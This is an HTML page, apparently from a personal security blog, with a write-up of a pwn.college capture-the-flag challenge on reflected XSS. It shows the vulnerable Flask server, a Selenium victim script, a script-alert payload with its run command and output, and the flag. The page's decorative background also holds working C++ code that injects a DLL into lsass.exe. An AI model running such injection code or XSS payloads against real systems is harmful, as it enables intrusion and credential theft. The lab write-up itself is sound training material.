@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS 3 — Writeup</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="XSS 3 — Writeup" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>XSS 3 — Writeup</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-challenge-overview">🧠 Challenge Overview</h2>
+
+<p>In this challenge, we are given a basic Flask web application that takes user input from the <code class="language-plaintext highlighter-rouge">msg</code> query parameter and reflects it on the page. Additionally, there is a headless browser (Selenium) acting as the victim that visits the crafted link and checks if a JavaScript alert is triggered.</p>
+
+<h2 id="-source-code-analysis">🧪 Source Code Analysis</h2>
+
+<h3 id="-challengeserver">📄 <code class="language-plaintext highlighter-rouge">/challenge/server</code></h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/opt/pwn.college/python
+</span>
+<span class="kn">import</span> <span class="n">flask</span>
+<span class="kn">import</span> <span class="n">os</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">challenge_get</span><span class="p">():</span>
+    <span class="k">return</span> <span class="sa">f</span><span class="sh">"""</span><span class="s">
+        &lt;html&gt;&lt;body&gt;
+        &lt;h1&gt;pwnmsg ephemeral message service&lt;/h1&gt;
+        The message:
+        </span><span class="si">{</span><span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">msg</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">(none)</span><span class="sh">"</span><span class="p">)</span><span class="si">}</span><span class="s">
+        &lt;hr&gt;
+        &lt;form&gt;
+            Craft a message:
+            &lt;input type=text name=msg&gt;
+            &lt;input type=submit value=</span><span class="sh">"</span><span class="s">Make URL!</span><span class="sh">"</span><span class="s">&gt;
+        &lt;/form&gt;
+        &lt;/body&gt;&lt;/html&gt;
+    </span><span class="sh">"""</span>
+
+<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">"</span><span class="s">SERVER_NAME</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">challenge.localhost:80</span><span class="sh">"</span>
+<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="sh">"</span><span class="s">challenge.localhost</span><span class="sh">"</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
+</code></pre></div></div>
+<p>The vulnerability lies in the fact that the msg parameter is directly injected into the HTML without any sanitization or encoding, resulting in a reflected XSS vulnerability.</p>
+
+<h3 id="challengevictim">/challenge/victim</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/opt/pwn.college/python
+</span>
+<span class="kn">import</span> <span class="n">psutil</span>
+<span class="kn">import</span> <span class="n">urllib</span>
+<span class="kn">import</span> <span class="n">atexit</span>
+<span class="kn">import</span> <span class="n">time</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">os</span>
+
+<span class="kn">from</span> <span class="n">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
+<span class="kn">from</span> <span class="n">selenium.webdriver.firefox.options</span> <span class="kn">import</span> <span class="n">Options</span> <span class="k">as</span> <span class="n">FirefoxOptions</span>
+<span class="kn">from</span> <span class="n">selenium.webdriver.firefox.service</span> <span class="kn">import</span> <span class="n">Service</span> <span class="k">as</span> <span class="n">FirefoxService</span>
+<span class="kn">from</span> <span class="n">selenium.webdriver.common.by</span> <span class="kn">import</span> <span class="n">By</span>
+<span class="kn">from</span> <span class="n">selenium.webdriver.support.wait</span> <span class="kn">import</span> <span class="n">WebDriverWait</span>
+<span class="kn">from</span> <span class="n">selenium.webdriver.support</span> <span class="kn">import</span> <span class="n">expected_conditions</span> <span class="k">as</span> <span class="n">EC</span>
+<span class="kn">from</span> <span class="n">selenium.common.exceptions</span> <span class="kn">import</span> <span class="n">TimeoutException</span><span class="p">,</span> <span class="n">WebDriverException</span>
+
+<span class="n">os</span><span class="p">.</span><span class="nf">setuid</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">geteuid</span><span class="p">())</span>
+<span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="nf">clear</span><span class="p">()</span>
+<span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="sh">"</span><span class="s">PATH</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><span class="sh">"</span>
+
+<span class="n">options</span> <span class="o">=</span> <span class="nc">FirefoxOptions</span><span class="p">()</span>
+<span class="n">options</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--headless</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">service</span> <span class="o">=</span> <span class="nc">FirefoxService</span><span class="p">(</span><span class="n">log_path</span><span class="o">=</span><span class="sh">"</span><span class="s">/dev/null</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">browser</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Firefox</span><span class="p">(</span><span class="n">service</span><span class="o">=</span><span class="n">service</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="n">options</span><span class="p">)</span>
+<span class="n">atexit</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="n">browser</span><span class="p">.</span><span class="n">quit</span><span class="p">)</span>
+
+<span class="n">open_ports</span> <span class="o">=</span> <span class="p">{</span><span class="n">s</span><span class="p">.</span><span class="n">laddr</span><span class="p">.</span><span class="n">port</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">psutil</span><span class="p">.</span><span class="nf">net_connections</span><span class="p">(</span><span class="n">kind</span><span class="o">=</span><span class="sh">"</span><span class="s">inet</span><span class="sh">"</span><span class="p">)</span> <span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="n">status</span> <span class="o">==</span> <span class="sh">"</span><span class="s">LISTEN</span><span class="sh">"</span><span class="p">}</span>
+<span class="k">if</span> <span class="mi">80</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">open_ports</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Service doesn</span><span class="sh">'</span><span class="s">t seem to be running?</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> URL</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">challenge_url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">url_parsed</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="nf">urlparse</span><span class="p">(</span><span class="n">challenge_url</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">url_parsed</span><span class="p">.</span><span class="n">hostname</span> <span class="o">!=</span> <span class="sh">"</span><span class="s">challenge.localhost</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Hostname should be </span><span class="sh">'</span><span class="s">challenge.localhost</span><span class="sh">'</span><span class="s">.</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">url_parsed</span><span class="p">.</span><span class="n">port</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">{</span><span class="bp">None</span><span class="p">,</span> <span class="mi">80</span><span class="p">}:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Port should be 80.</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Visiting </span><span class="si">{</span><span class="n">challenge_url</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">browser</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">challenge_url</span><span class="p">)</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="nc">WebDriverWait</span><span class="p">(</span><span class="n">browser</span><span class="p">,</span> <span class="mi">1</span><span class="p">).</span><span class="nf">until</span><span class="p">(</span><span class="n">EC</span><span class="p">.</span><span class="nf">alert_is_present</span><span class="p">())</span>
+<span class="k">except</span> <span class="n">TimeoutException</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Failure: JavaScript alert did not trigger...</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Alert triggered! Your reward:</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">().</span><span class="nf">strip</span><span class="p">())</span>
+</code></pre></div></div>
+<p>This script simulates a victim visiting the attacker’s crafted XSS URL. If an alert box is triggered, the flag is printed.</p>
+
+<hr />
+
+<h2 id="exploit">Exploit</h2>
+<p>A simple XSS payload like the following is enough to trigger an alert:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://challenge.localhost/?msg=&lt;script&gt;alert("PWNED")&lt;/script&gt;
+</code></pre></div></div>
+<p>Run the following:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/challenge/victim <span class="s1">'http://challenge.localhost/?msg=&lt;script&gt;alert("PWNED")&lt;/script&gt;'</span>
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Visiting http://challenge.localhost/?msg=&lt;script&gt;alert("PWNED")&lt;/script&gt;
+Alert triggered! Your reward:
+pwn.college{w80D_zz1e13y2tS3mvOEVhcIOmQ.QX0kzMzwSM0IzMyEzW}
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="flag">Flag</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college{w80D_zz1e13y2tS3mvOEVhcIOmQ.QX0kzMzwSM0IzMyEzW}
+</code></pre></div></div>
+
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
